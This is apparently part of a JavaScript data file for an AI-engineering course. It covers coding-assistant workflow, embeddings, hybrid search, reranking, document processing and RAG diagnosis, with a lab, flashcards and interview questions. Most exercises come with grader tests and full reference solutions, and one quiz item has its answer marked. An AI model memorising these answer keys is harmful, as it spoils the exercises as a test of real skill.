    { id: "x103", tags: [], topic: "prompting", q: "With a long document and a question, the usual best layout is:", options: ["Question first, then the document", "Document first in labelled tags, question at the end", "Document split across several system prompts", "Question repeated before every paragraph"], answer: 1, why: "Long documents first and the question last tends to give better answers, and a stable prefix caches well." },
  ],
  labs: [{
    id: "extracteval", title: "Measured extractor: validation, retries and a golden set", level: "Beginner", time: "4-6 hours", stack: ["Python", "LLM API or Ollama", "Pydantic or JSON Schema"],
    goal: "Turn your first app into something you can defend in an interview: it validates every result, retries with the error when the model gets it wrong, and reports its accuracy on 25 hand-labelled job postings, broken down by failure type.",
    before: [
      "**Cost:** cents. 25 postings, a few retries and two or three eval runs with a small model.",
      "**Set a spending limit** in the provider's console before you start.",
      "**Keep the key out of code and git:** `.env` plus `.gitignore`, as in your first app.",
      "**Free alternative:** run a local model with Ollama and ask for JSON in the prompt; validation, retries and the eval work exactly the same.",
    ],
    steps: [
      { do: "Label 25 real postings by hand: title, company, skills, remote and salary range, one JSON object per line in `golden.jsonl`",
        see: "A file of 25 lines, including at least 5 awkward cases.",
        hint: "Awkward cases: no salary, a salary in another currency, 'remote-friendly', two company names, a skills list in prose. These are where models fail." },
      { do: "Write the schema with types, enums and ranges, plus your own business rules (salary_min no bigger than salary_max)",
        see: "Feeding it a few broken examples by hand gives one readable error each.",
        hint: "Pydantic models or your `validate` exercise. Field descriptions are part of the prompt, so make them specific." },
      { do: "Add a retry loop that sends the validation error back to the model, at most 2 retries, logging every failure",
        see: "The log shows at least one case where a retry fixed a bad first answer.",
        hint: "Your `extract_with_retry` exercise is this loop." },
      { do: "Run the eval: per-field accuracy and the overall pass rate against `golden.jsonl`",
        see: "A table like `title 25/25, company 24/25, skills 19/25, remote 22/25, salary 18/25`.",
        hint: "Compare normalized values (lowercase, trimmed); for skills, compare as sets." },
      { do: "Error analysis: read every failure, give it a category, and count the categories",
        see: "A short table of failure categories with counts, biggest first.",
        hint: "Your `failure_tally` exercise does the counting. Expect 3-6 categories." },
      { do: "Fix the biggest category (prompt, schema description or an example), re-run, and record before and after",
        see: "The category shrinks and no other field gets worse.",
        hint: "Change one thing per run, so you know what helped." },
      { do: "Write the README: what it does, the eval table before and after, cost per 100 postings, and what you'd do next",
        see: "A reviewer can see in one minute that you measured the work.",
        hint: "Lead with the result (\"salary accuracy 18/25 to 24/25\"), then how." },
    ],
    resume: "Built an LLM extraction pipeline with schema validation and error-feedback retries, measured on a hand-labelled golden set and improved through error analysis (per-field accuracy reported before and after each change).",
    cost: "Cents with a small model. Keep the spending limit on.",
    stretch: ["Compare two models on the same golden set and choose one by quality, latency and price", "Add a CI job that fails if accuracy drops"],
  }],
  glossary: [
    ["Enum", "A fixed list of allowed values for a field, such as remote, hybrid or onsite."],
    ["Error analysis", "Reading real outputs, labelling each failure, and counting the labels to decide what to fix first."],
  ],
});

// ---------------- Modules 7-10: embeddings & search, documents & multimodal, coding assistants, RAG ----------------
extendTrack(AI, {
  topics: [
    {
      id: "assistants", title: "AI coding assistants: plan, review, test", short: "Code",
      why: "Postings ask for effective use of AI coding assistants with review and tests, and some interviews run one round with AI tools and one without. You need the workflow and the judgement to catch what the tool gets wrong.",
      body: `<p>An <b>AI coding assistant</b> (Claude Code, Cursor, Copilot, Codex and others) is an agent for your codebase: it reads files, runs commands and edits code. Used well it saves hours on every project from here on; used carelessly it produces code that looks right, passes its own tests, and breaks in production. You stay responsible for everything you merge.</p>
        <h3>A workflow that holds up: explore, plan, code, commit</h3>
        <ol><li><b>Explore:</b> ask it to read the relevant files and explain how they work before changing anything. Correct its misunderstandings now, not after 300 lines of code.</li>
        <li><b>Plan:</b> ask for a short written plan (which files, what changes, how it will be tested) and review it. This is the cheapest place to catch a wrong assumption.</li>
        <li><b>Code in small steps, tests first:</b> write (or have it write) a failing test from the <i>specification</i>, then the code; run the whole suite after each step.</li>
        <li><b>Commit:</b> read the diff like a colleague's pull request, then commit a small, working step with a clear message.</li></ol>
        <p>Give it context the way you'd brief a new teammate: a project instruction file (<code>CLAUDE.md</code>, <code>AGENTS.md</code> or a rules file) with the build and test commands, conventions and no-go areas. Reusable instructions can be packaged as <button class="link-btn inline-link" data-trgo="ai|learn|mcp">skills</button>.</p>
        <h3>What to look for when reviewing AI-written code</h3>
        <ul><li><b>Invented APIs:</b> functions or arguments that don't exist in the library (<code>json.parse</code> is JavaScript, not Python). Check against the docs.</li>
        <li><b>Edge cases:</b> empty input, the last item, None, off-by-one ranges, time zones. The happy path is usually right; the edges often aren't.</li>
        <li><b>Tests that prove nothing:</b> tests generated from the code repeat its bugs. Tests must come from the specification, and a test you never saw fail might not test anything.</li>
        <li><b>Swallowed errors</b> (<code>except: pass</code>), secrets in code, unsafe handling of user input, and changes outside the task you asked for.</li></ul>
        <h3>Guardrails and interviews</h3>
        <p>Never paste secrets, customer data or confidential code into a tool your employer hasn't approved; review commands before they run against shared systems; work on a branch. In interviews, rounds that allow AI tools judge how you direct and verify the tool; rounds without them check you can still write and debug code yourself, so practise both. In take-homes, say what you used AI for. The <button class="link-btn inline-link" data-trgo="roles|learn|aicoding">Roles lesson on coding assistants</button> covers how postings phrase this.</p>`,
      example: `# The spec says: slugify("  AI & ML: 2026!  ") == "ai-ml-2026"
import re

def slugify_ai(text):            # what the assistant wrote: looks fine
    return re.sub("[^a-z0-9]", "-", text.lower()).strip("-")

def slugify_fixed(text):         # one character different: + joins runs of separators
    return re.sub("[^a-z0-9]+", "-", text.lower()).strip("-")

for fn in [slugify_ai, slugify_fixed]:
    result = fn("  AI & ML: 2026!  ")
    print(fn.__name__, repr(result), "PASS" if result == "ai-ml-2026" else "FAIL")
`,
      exercises: [{
        key: "spec-tests", prompt: "Write tests from the specification, not from the code. Write check_slugify(fn) that uses assert to check fn against this spec: lowercase everything; every run of characters that aren't letters or digits becomes one hyphen; no hyphens at the start or end. The grader calls it with a correct slugify (your checks must pass) and with three buggy versions an assistant might write (each must make one of your asserts fail).",
        example: `Spec examples you can use:\nslugify("Hello World") == "hello-world"\nslugify("  AI & ML: 2026!  ") == "ai-ml-2026"\nslugify("") == ""`,
        hint: "Cover each rule with at least one case: uppercase letters, several separators in a row (\" & \" or \"--\"), and spaces or punctuation at both ends. One `assert fn(...) == ...` line per case.",
        starter: `def check_slugify(fn):
    pass
`,
        tests: `import re
def correct(text):
    return re.sub("[^a-z0-9]+", "-", text.lower()).strip("-")
def keeps_case(text):
    return re.sub("[^A-Za-z0-9]+", "-", text).strip("-")
def no_collapse(text):
    return re.sub("[^a-z0-9]", "-", text.lower()).strip("-")
def no_trim(text):
    return re.sub("[^a-z0-9]+", "-", text.lower())
check_slugify(correct)
for bad in [keeps_case, no_collapse, no_trim]:
    try:
        check_slugify(bad)
    except AssertionError:
        continue
    raise SystemExit("your checks didn't catch the bug in " + bad.__name__)`,
        solution: `def check_slugify(fn):
    assert fn("Hello World") == "hello-world"
    assert fn("  AI & ML: 2026!  ") == "ai-ml-2026"
    assert fn("a--b") == "a-b"
    assert fn("") == ""`,
      }, {
        key: "invented-api", prompt: "Assistants sometimes call functions that don't exist. Write invented_calls(calls, known): calls is a list of dotted names the generated code uses, like \"json.loads\"; known maps each real module to the set of its real function names. Return the calls whose module isn't in known or whose function isn't in that module's set, in order, without repeats.",
        example: `known = {"json": {"loads", "dumps"}, "os": {"getenv"}}\ninvented_calls(["json.loads", "json.parse", "os.getenv", "yaml.read", "json.parse"], known)\nreturns ["json.parse", "yaml.read"]`,
        hint: "`module, name = call.split(\".\", 1)`. A call is invented if `module not in known or name not in known[module]`. Keep a list and skip calls already in it.",
        starter: `def invented_calls(calls, known):
    pass
`,
        tests: `known = {"json": {"loads", "dumps"}, "os": {"getenv"}, "re": {"sub", "findall"}}
assert invented_calls(["json.loads", "json.parse", "os.getenv", "yaml.read", "json.parse"], known) == ["json.parse", "yaml.read"]
assert invented_calls(["re.sub", "re.findall"], known) == []
assert invented_calls(["re.replace"], known) == ["re.replace"], "Python's re has sub, not replace"`,
        solution: `def invented_calls(calls, known):
    invented = []
    for call in calls:
        module, name = call.split(".", 1)
        if (module not in known or name not in known[module]) and call not in invented:
            invented.append(call)
    return invented`,
      }, {
        key: "ai-bug", debug: true, prompt: "An assistant wrote batches() to split records into groups for a nightly job. It looked right in review, but production logs show some records are never processed. Find the edge-case bug and fix it.",
        example: "batches([1, 2, 3, 4, 5], 2) returns [[1, 2], [3, 4], [5]]\nbatches([1, 2], 2) returns [[1, 2]]",
        hint: "Try it on 5 items with size 2 and on 2 items with size 2. Which start positions does the range produce, and which does it miss?",
        starter: `def batches(items, size):
    # Split items into lists of at most size items, in order.
    return [items[i:i + size] for i in range(0, len(items) - size, size)]
`,
        tests: `assert batches([1, 2, 3, 4, 5], 2) == [[1, 2], [3, 4], [5]], f"the last record is lost; got {batches([1, 2, 3, 4, 5], 2)}"
assert batches([1, 2], 2) == [[1, 2]], "exactly one full batch"
assert batches([], 3) == []
assert sum(len(b) for b in batches(list(range(101)), 10)) == 101, "every record is processed"`,
        solution: `def batches(items, size):
    # Split items into lists of at most size items, in order.
    return [items[i:i + size] for i in range(0, len(items), size)]`,
      }],
      cards: [
        ["Explore, plan, code, commit: why plan before coding with an assistant?", "A written plan is the cheapest place to catch wrong assumptions; fixing them after hundreds of generated lines costs far more."],
        ["Why aren't tests generated from the code enough?", "They describe what the code does, bugs included. Tests must come from the specification, and you should see each one fail before trusting it."],
        ["What should never go into an unapproved AI tool?", "Secrets and credentials, customer or personal data, and confidential code or designs."],
      ],
    },
  ],
  why: {
    embeddings: "Semantic search, RAG retrieval, deduplication and routing all run on embeddings. When retrieval returns the wrong documents, this is the layer you'll debug.",
    vectorstores: "Most RAG quality problems are retrieval problems. Chunking, keyword plus vector search and reranking are the knobs you'll tune, and take-home reviewers expect you to justify each choice with numbers.",
    multimodal: "Document processing is in about one in six AI take-homes, and every RAG system starts by turning PDFs, scans and images into text with page numbers you can cite.",
    rag: "RAG is the most requested AI skill in postings and the most common take-home. Interviewers expect you to diagnose whether a bad answer came from retrieval or generation, not just to build the pipeline.",
  },
  append: {
    vectorstores: `<h3>Keyword search, fusion and reranking in practice</h3>
      <ul><li><b>Keyword scoring</b> (BM25 and its simpler cousin TF-IDF): a word that appears in few documents counts for more than a common one (<b>inverse document frequency</b>: "E1234" is rare, "the" is everywhere), repeating a word helps with diminishing returns, and very long documents are scaled down so they don't win by size alone.</li>
      <li><b>Fusion:</b> vector and keyword scores are on different scales, so either normalize each list to 0-1 and take a weighted sum, or use <b>reciprocal rank fusion</b>, which only uses positions in each list (the <button class="link-btn inline-link" data-trgo="roles|learn|permrag">permission-aware retrieval</button> lesson has an exercise on it).</li>
      <li><b>Reranking:</b> an embedding model encodes the query and each document separately (a <b>bi-encoder</b>: fast, so it can search millions). A reranker reads the query and a document together (a <b>cross-encoder</b>: more accurate, much slower). So retrieve 20-50 candidates cheaply, then rerank only those.</li>
      <li><b>Approximate search trade-off:</b> vector index settings trade recall for speed. Measure recall@k on your own questions when you change them.</li></ul>`,
    multimodal: `<h3>Documents and PDFs at scale</h3>
      <ul><li>Use the PDF's <b>text layer</b> when it has one (cheap, exact); send pages as images to a vision model only when they're scanned or the layout (tables, charts, forms) matters.</li>
      <li>Providers limit pages and request size per call, so long PDFs are processed in <b>page batches</b>. Keep page numbers with everything you extract: they're your citations.</li>
      <li><b>Validate what you extract:</b> line items should add up to the total, dates should parse, IDs should match a known format. Arithmetic checks catch most misread digits.</li></ul>
      <h3>Audio</h3>
      <p>Most apps <b>transcribe</b> speech to text first (speech-to-text, priced per minute of audio), then work with the text; some models take audio directly. Long recordings are cut into chunks with a few seconds of <b>overlap</b> so words at a boundary aren't lost, ideally at pauses. Keep timestamps (for citations, "at 12:30 the customer said...") and use <b>diarization</b> (labelling who spoke when) for meetings and calls.</p>
      <h3>What an image costs</h3>
      <p>Image tokens grow with pixel count. One provider documents an estimate of about width &times; height / 750 tokens, so a 1000 &times; 1000 image is about 1,334 tokens; check your provider's own formula and size limits.</p>`,
    rag: `<h3>Diagnosing a bad answer, step by step</h3>
      <ol><li><b>Was the right chunk retrieved?</b> If not, it's a <b>retrieval failure</b>: look at chunking, the embedding model, k, keyword search for exact terms, metadata filters, or rewriting the user's question into a better search query.</li>
      <li><b>Retrieved but answered wrongly?</b> A <b>generation failure</b>: the prompt, grounding instructions, too many distracting chunks, or the model.</li>
      <li><b>Right answer without the right chunk?</b> The model answered from memory. It may be correct today, but it isn't grounded or citable, so treat it as a risk.</li>
      <li><b>Citations that don't support the claim?</b> A <b>faithfulness</b> failure; catch it with a judge or by checking cited numbers exist.</li></ol>
      <p>Measure retrieval with recall@k and <b>MRR</b> (mean reciprocal rank: 1 if the first relevant result is ranked first, 1/2 if second, and so on, averaged over questions), and answers with faithfulness and correctness.</p>
      <h3>Permissions and freshness</h3>
      <p>Filter chunks by what the user may see <b>at retrieval time</b>, before anything reaches the model; never rely on the model to withhold text it was given (see <button class="link-btn inline-link" data-trgo="roles|learn|permrag">Permission-aware retrieval</button>). Re-index when documents change and delete chunks of removed documents, or the bot will cite policies that no longer exist.</p>`,
  },
  exercises: {
    embeddings: [{
      key: "unit", prompt: "Write normalize(v) that returns v scaled to length 1 (each number divided by the vector's length). Raise ValueError for a zero vector. After normalizing, the dot product of two vectors equals their cosine similarity, which is why vector databases often store normalized vectors.",
      example: "normalize([3, 4]) returns [0.6, 0.8]",
      hint: "`length = math.sqrt(sum(x * x for x in v))`; raise if it's 0; return `[x / length for x in v]`.",
      starter: `import math

def normalize(v):
    pass
`,
      tests: `import math
r = normalize([3, 4])
assert abs(r[0] - 0.6) < 1e-9 and abs(r[1] - 0.8) < 1e-9, r
u = normalize([2, -1, 2])
assert abs(math.sqrt(sum(x * x for x in u)) - 1) < 1e-9, "length must be 1"
a, b = normalize([1, 2]), normalize([2, 4])
assert abs(sum(x * y for x, y in zip(a, b)) - 1) < 1e-9, "same direction: dot product 1 after normalizing"
try:
    normalize([0, 0]); raise SystemExit("expected ValueError")
except ValueError:
    pass`,
      solution: `import math

def normalize(v):
    length = math.sqrt(sum(x * x for x in v))
    if length == 0:
        raise ValueError("can't normalize a zero vector")
    return [x / length for x in v]`,
    }, {
      key: "near-dupes", prompt: "Deduplicate before indexing. Write near_duplicates(vectors, threshold): vectors is a list of embeddings. Return every pair of positions (i, j) with i < j whose cosine similarity is at least threshold, in order of i, then j.",
      example: "near_duplicates([[1, 0], [0.99, 0.05], [0, 1]], 0.95) returns [(0, 1)]",
      hint: "Two nested loops: `for i in range(len(vectors)):` and `for j in range(i + 1, len(vectors)):`. Write a small cosine helper inside the exercise.",
      starter: `import math

def near_duplicates(vectors, threshold):
    pass
`,
      tests: `vs = [[1, 0], [0.99, 0.05], [0, 1], [0.02, 1], [-1, 0]]
assert near_duplicates(vs, 0.95) == [(0, 1), (2, 3)], near_duplicates(vs, 0.95)
assert near_duplicates(vs, 1.01) == []
assert near_duplicates([[1, 1]], 0.5) == []`,
      solution: `import math

def cos(a, b):
    dot = sum(x * y for x, y in zip(a, b))
    return dot / (math.sqrt(sum(x * x for x in a)) * math.sqrt(sum(y * y for y in b)))

def near_duplicates(vectors, threshold):
    pairs = []
    for i in range(len(vectors)):
        for j in range(i + 1, len(vectors)):
            if cos(vectors[i], vectors[j]) >= threshold:
                pairs.append((i, j))
    return pairs`,
    }, {
      key: "cosine-debug", debug: true, prompt: "Users complain that semantic search ranks long, rambling documents above short exact answers. similarity uses the raw dot product, which grows with vector length, and long texts here have longer vectors. Fix it to return cosine similarity.",
      example: "similarity([1, 0], [10, 0]) returns 1.0 (same direction)\nsimilarity([1, 0], [1, 1]) returns 0.707...",
      hint: "Divide the dot product by the product of the two vectors' lengths (`math.sqrt(sum(x * x for x in a))`).",
      starter: `import math

def similarity(a, b):
    return sum(x * y for x, y in zip(a, b))
`,
      tests: `assert abs(similarity([1, 0], [10, 0]) - 1) < 1e-9, "same direction should score 1 whatever the length"
query, short_answer, long_ramble = [1, 0], [1, 0.1], [5, 5]
assert similarity(query, short_answer) > similarity(query, long_ramble), "the close match must win"
assert abs(similarity([1, 0], [1, 1]) - 0.5 ** 0.5) < 1e-9`,
      solution: `import math

def similarity(a, b):
    dot = sum(x * y for x, y in zip(a, b))
    return dot / (math.sqrt(sum(x * x for x in a)) * math.sqrt(sum(y * y for y in b)))`,
    }],
    vectorstores: [{
      key: "keyword-score", prompt: "Write keyword_rank(query, docs) with TF-IDF scoring: docs maps an id to its text. Words are the lowercased text split on spaces, with . , ? ! stripped from each word's ends. A document's score is the sum, over the distinct query words, of (how many times the word appears in the document) × log(N / df), where N is the number of documents and df how many documents contain the word (skip words no document contains). Return the ids of documents scoring above 0, highest first (ties keep the docs order).",
      example: `docs = {"d1": "Reset your password from the login page.",\n        "d2": "Vacation days reset each January.",\n        "d3": "Error E1234 when logging in."}\nkeyword_rank("E1234 error", docs) returns ["d3"]\nkeyword_rank("reset password", docs) returns ["d1", "d2"]`,
      hint: "Tokenize with a helper: `[w.strip(\".,?!\") for w in text.lower().split()]`. Compute df for each query word by counting documents whose word list contains it. Then score each document; `sorted(..., key=lambda p: p[1], reverse=True)` keeps ties in order.",
      starter: `import math

def keyword_rank(query, docs):
    pass
`,
      tests: `docs = {"d1": "Reset your password from the login page.",
        "d2": "Vacation days reset each January.",
        "d3": "Error E1234 when logging in.",
        "d4": "Password rules: the password needs 12 characters. Change your password yearly."}
assert keyword_rank("E1234 error", docs) == ["d3"], keyword_rank("E1234 error", docs)
assert keyword_rank("reset password", docs) == ["d4", "d1", "d2"], "d4 says password three times; d1 has both words once; d2 only reset"
assert keyword_rank("kubernetes", docs) == []
assert keyword_rank("the", {"a": "the cat", "b": "the dog"}) == [], "a word in every document scores 0"`,
      solution: `import math

def words(text):
    return [w.strip(".,?!") for w in text.lower().split()]

def keyword_rank(query, docs):
    tokenized = {doc_id: words(text) for doc_id, text in docs.items()}
    n = len(docs)
    scores = []
    for doc_id, toks in tokenized.items():
        score = 0
        for q in set(words(query)):
            df = sum(1 for t in tokenized.values() if q in t)
            if df:
                score = score + toks.count(q) * math.log(n / df)
        scores.append((doc_id, score))
    ranked = sorted(scores, key=lambda p: p[1], reverse=True)
    return [doc_id for doc_id, score in ranked if score > 0]`,
    }, {
      key: "hybrid", prompt: "Write hybrid_rank(vector_scores, keyword_scores, alpha): each is a dict mapping document ids to scores on its own scale. Min-max normalize each dict to 0-1 ((score - min) / (max - min); if every score in a dict is equal, they all become 1.0). A document missing from a dict gets 0 for it. Combined score = alpha × vector + (1 - alpha) × keyword. Return all ids, highest combined score first, ties in alphabetical order.",
      example: `hybrid_rank({"a": 0.9, "b": 0.7, "c": 0.5}, {"c": 12.0, "d": 3.0}, 0.5)\nreturns ["a", "c", "b", "d"]   (a: 0.5 and c: 0.5 tie, so alphabetical; b: 0.25; d: 0)`,
      hint: "Write `norm(scores)` returning a new dict. Collect every id with `set(vector_scores) | set(keyword_scores)`, compute each combined score with `.get(id, 0)`, then `sorted(ids, key=lambda i: (-combined[i], i))`.",
      starter: `def hybrid_rank(vector_scores, keyword_scores, alpha):
    pass
`,
      tests: `r = hybrid_rank({"a": 0.9, "b": 0.7, "c": 0.5}, {"c": 12.0, "d": 3.0}, 0.5)
assert r == ["a", "c", "b", "d"], r
assert hybrid_rank({"a": 0.9, "b": 0.7}, {"b": 5.0, "a": 1.0}, 1.0) == ["a", "b"], "alpha 1 is pure vector search"
assert hybrid_rank({"a": 0.9, "b": 0.7}, {"b": 5.0, "a": 1.0}, 0.0) == ["b", "a"], "alpha 0 is pure keyword search"
assert hybrid_rank({"x": 0.4}, {}, 0.5) == ["x"]`,
      solution: `def norm(scores):
    if not scores:
        return {}
    lo, hi = min(scores.values()), max(scores.values())
    if hi == lo:
        return {k: 1.0 for k in scores}
    return {k: (v - lo) / (hi - lo) for k, v in scores.items()}

def hybrid_rank(vector_scores, keyword_scores, alpha):
    v, k = norm(vector_scores), norm(keyword_scores)
    ids = set(vector_scores) | set(keyword_scores)
    combined = {i: alpha * v.get(i, 0) + (1 - alpha) * k.get(i, 0) for i in ids}
    return sorted(ids, key=lambda i: (-combined[i], i))`,
    }, {
      key: "rerank", prompt: "Rerank only the top of the list. Write rerank(query, candidates, score_fn, depth): candidates is a list of (id, text) pairs already ranked by fast retrieval. Call the slow score_fn(query, text) only for the first depth candidates, reorder those by score (highest first, ties keep their order), and return all ids: the reranked top followed by the rest in their original order.",
      example: `candidates = [("d1", "..."), ("d2", "..."), ("d3", "..."), ("d4", "...")]\nIf score_fn scores d1, d2, d3 as 0.2, 0.9, 0.5:\nrerank(q, candidates, score_fn, 3) returns ["d2", "d3", "d1", "d4"]`,
      hint: "`top, rest = candidates[:depth], candidates[depth:]`. Score the top into (id, score) pairs, sort them with `key=lambda p: p[1], reverse=True`, then add the ids of rest.",
      starter: `def rerank(query, candidates, score_fn, depth):
    pass
`,
      tests: `calls = []
scores = {"d1": 0.2, "d2": 0.9, "d3": 0.5, "d4": 1.0}
def score_fn(query, text):
    calls.append(text)
    return scores[text]
cands = [(d, d) for d in ["d1", "d2", "d3", "d4"]]
assert rerank("q", cands, score_fn, 3) == ["d2", "d3", "d1", "d4"]
assert len(calls) == 3, "only the top depth candidates may be scored: the reranker is slow"
assert rerank("q", cands, score_fn, 10) == ["d4", "d2", "d3", "d1"]
assert rerank("q", cands, score_fn, 0) == ["d1", "d2", "d3", "d4"]`,
      solution: `def rerank(query, candidates, score_fn, depth):
    top, rest = candidates[:depth], candidates[depth:]
    scored = [(doc_id, score_fn(query, text)) for doc_id, text in top]
    scored = sorted(scored, key=lambda p: p[1], reverse=True)
    return [doc_id for doc_id, s in scored] + [doc_id for doc_id, text in rest]`,
    }],
    multimodal: [{
      key: "image-tokens", prompt: "Estimate what an image costs. Write image_tokens(width, height) using the estimate tokens = width × height / 750, rounded up to a whole token.",
      example: "image_tokens(1000, 1000) returns 1334",
      hint: "`math.ceil(width * height / 750)`, or with whole numbers only: `-(-(width * height) // 750)`.",
      starter: `import math

def image_tokens(width, height):
    pass
`,
      tests: `assert image_tokens(1000, 1000) == 1334, f"got {image_tokens(1000, 1000)}"
assert image_tokens(750, 1) == 1
assert image_tokens(1092, 1092) == 1590
assert image_tokens(4000, 3000) == 16000, "a phone photo straight from the camera: resize it first"`,
      solution: `import math

def image_tokens(width, height):
    return math.ceil(width * height / 750)`,
    }, {
      key: "pdf-batches", prompt: "Write page_batches(n_pages, max_pages) that splits a PDF into page ranges for separate requests: a list of (first, last) page numbers, counting from 1, each covering at most max_pages pages.",
      example: "page_batches(10, 4) returns [(1, 4), (5, 8), (9, 10)]",
      hint: "`for first in range(1, n_pages + 1, max_pages):` and the last page is `min(first + max_pages - 1, n_pages)`.",
      starter: `def page_batches(n_pages, max_pages):
    pass
`,
      tests: `assert page_batches(10, 4) == [(1, 4), (5, 8), (9, 10)]
assert page_batches(5, 5) == [(1, 5)]
assert page_batches(0, 5) == []
assert page_batches(3, 1) == [(1, 1), (2, 2), (3, 3)]`,
      solution: `def page_batches(n_pages, max_pages):
    return [(first, min(first + max_pages - 1, n_pages)) for first in range(1, n_pages + 1, max_pages)]`,
    }, {
      key: "audio-chunks", prompt: "Write audio_chunks(duration, chunk, overlap) that cuts a recording of duration seconds into (start, end) pieces for transcription: each piece is chunk seconds long (the last may be shorter), each starts chunk - overlap seconds after the previous one, and you stop once a piece reaches the end. Raise ValueError if overlap is not smaller than chunk.",
      example: "audio_chunks(100, 30, 5) returns [(0, 30), (25, 55), (50, 80), (75, 100)]",
      hint: "Like chunking words: `start = 0`, then loop: `end = min(start + chunk, duration)`, append, `break` if end == duration, else `start = start + chunk - overlap`.",
      starter: `def audio_chunks(duration, chunk, overlap):
    pass
`,
      tests: `assert audio_chunks(100, 30, 5) == [(0, 30), (25, 55), (50, 80), (75, 100)], audio_chunks(100, 30, 5)
assert audio_chunks(60, 30, 0) == [(0, 30), (30, 60)]
assert audio_chunks(10, 30, 5) == [(0, 10)], "a short clip is one piece"
try:
    audio_chunks(60, 10, 10); raise SystemExit("expected ValueError")
except ValueError:
    pass`,
      solution: `def audio_chunks(duration, chunk, overlap):
    if overlap >= chunk:
        raise ValueError("overlap must be smaller than chunk")
    pieces = []
    start = 0
    while True:
        end = min(start + chunk, duration)
        pieces.append((start, end))
        if end == duration:
            return pieces
        start = start + chunk - overlap`,
    }, {
      key: "total-debug", debug: true, prompt: "The invoice checker flags correct invoices as misread: a receipt with items 0.10 and 0.20 and a total of 0.30 fails. check_total compares floating-point numbers exactly, and 0.1 + 0.2 isn't exactly 0.3 in binary. Fix it to compare to the cent.",
      example: "check_total([0.10, 0.20], 0.30) returns True\ncheck_total([10, 5], 15.5) returns False",
      hint: "Compare whole cents: `round(sum(items) * 100) == round(total * 100)`. (Real systems often store money as integer cents or Decimal for this reason.)",
      starter: `def check_total(items, total):
    return sum(items) == total
`,
      tests: `assert check_total([0.10, 0.20], 0.30) is True, "0.1 + 0.2 should count as 0.30"
assert check_total([19.99, 5.01, 0.10], 25.10) is True
assert check_total([10, 5], 15.5) is False, "a real mismatch must still fail"
assert check_total([], 0) is True`,
      solution: `def check_total(items, total):
    return round(sum(items) * 100) == round(total * 100)`,
    }],
    rag: [{
      key: "diagnose", prompt: "Write diagnose(case) to label a RAG failure. case has \"gold_ids\" (the chunks that contain the answer), \"retrieved_ids\" and \"answer_correct\". Return \"ok\" if a gold chunk was retrieved and the answer is correct; \"generation\" if a gold chunk was retrieved but the answer is wrong; \"retrieval\" if no gold chunk was retrieved and the answer is wrong; \"ungrounded\" if the answer is correct although no gold chunk was retrieved.",
      example: `diagnose({"gold_ids": ["c7"], "retrieved_ids": ["c1", "c7"], "answer_correct": False}) returns "generation"`,
      hint: "`found = any(g in case[\"retrieved_ids\"] for g in case[\"gold_ids\"])`, then four branches on found and answer_correct.",
      starter: `def diagnose(case):
    pass
`,
      tests: `assert diagnose({"gold_ids": ["c7"], "retrieved_ids": ["c1", "c7"], "answer_correct": False}) == "generation"
assert diagnose({"gold_ids": ["c7"], "retrieved_ids": ["c1", "c2"], "answer_correct": False}) == "retrieval"
assert diagnose({"gold_ids": ["c7", "c8"], "retrieved_ids": ["c8"], "answer_correct": True}) == "ok"
assert diagnose({"gold_ids": ["c7"], "retrieved_ids": ["c2"], "answer_correct": True}) == "ungrounded", "right answer, but not from the sources"`,
      solution: `def diagnose(case):
    found = any(g in case["retrieved_ids"] for g in case["gold_ids"])
    if found:
        return "ok" if case["answer_correct"] else "generation"
    return "ungrounded" if case["answer_correct"] else "retrieval"`,
    }, {
      key: "mrr", prompt: "Write mrr(results): results is a list of (retrieved_ids, relevant_ids) pairs, one per question. For each question, the reciprocal rank is 1 / (position of the first relevant id, counting from 1), or 0 if none was retrieved. Return the average over the questions (0.0 for an empty list).",
      example: `mrr([(["d3", "d1"], ["d1"]), (["d2"], ["d2"]), (["d5"], ["d9"])]) returns 0.5\n((1/2 + 1 + 0) / 3)`,
      hint: "For each pair, loop `for pos, doc in enumerate(retrieved, 1):` and stop at the first doc in relevant.",
      starter: `def mrr(results):
    pass
`,
      tests: `assert abs(mrr([(["d3", "d1"], ["d1"]), (["d2"], ["d2"]), (["d5"], ["d9"])]) - 0.5) < 1e-9
assert mrr([(["a", "b", "c"], ["c", "b"])]) == 0.5, "the first relevant hit counts"
assert mrr([]) == 0.0`,
      solution: `def mrr(results):
    if not results:
        return 0.0
    total = 0.0
    for retrieved, relevant in results:
        for pos, doc in enumerate(retrieved, 1):
            if doc in relevant:
                total = total + 1 / pos
                break
    return total / len(results)`,
    }, {
      key: "citation-debug", debug: true, prompt: "bad_citations should return the citation numbers in an answer, like [2], that don't match any source (1 to n_sources), in increasing order. It reports false alarms: for \"You get 15 days [1], see also [12]\" with 3 sources it returns [12, 15], because it reads every number in the text, not just the ones in square brackets. Fix the pattern so only numbers inside square brackets count.",
      example: `bad_citations("You get 15 days [1], see also [12].", 3) returns [12]`,
      hint: "Square brackets are special characters in a regex, so match them literally with `re.escape(\"[\")` and `re.escape(\"]\")`, and capture the number between: `re.escape(\"[\") + \"([0-9]+)\" + re.escape(\"]\")`. With a capture group, re.findall returns just the captured numbers.",
      starter: `import re

def bad_citations(answer, n_sources):
    numbers = sorted(set(int(d) for d in re.findall("[0-9]+", answer)))
    return [n for n in numbers if n < 1 or n > n_sources]
`,
      tests: `assert bad_citations("You get 15 days [1], see also [12].", 3) == [12], bad_citations("You get 15 days [1], see also [12].", 3)
assert bad_citations("Per [2] and [3], in 2026.", 3) == []
assert bad_citations("[0] and [4] and [4]", 3) == [0, 4]
assert bad_citations("No citations, 99 days.", 2) == []`,
      solution: `import re

CITATION = re.escape("[") + "([0-9]+)" + re.escape("]")

def bad_citations(answer, n_sources):
    numbers = sorted(set(int(d) for d in re.findall(CITATION, answer)))
    return [n for n in numbers if n < 1 or n > n_sources]`,
    }],
  },
  questions: [
    { id: "q137", topic: "embeddings", q: "How would you choose an embedding model for a retrieval system?", a: "Shortlist with public retrieval benchmarks, then decide on your own data: build 50-100 real questions with known relevant chunks and compare recall@k. Weigh language and domain coverage, maximum input length, vector size (storage and search cost), price or hosting, and latency. Changing models later means re-embedding everything, so test before committing." },
    { id: "q138", topic: "embeddings", q: "What can embeddings do besides search?", a: "Deduplicate near-identical documents, cluster feedback or tickets into themes, classify with few labels (nearest labelled example), route requests to the right prompt, recommend similar items, and flag anomalies far from everything else. All of them reuse the same vectors and cosine similarity." },
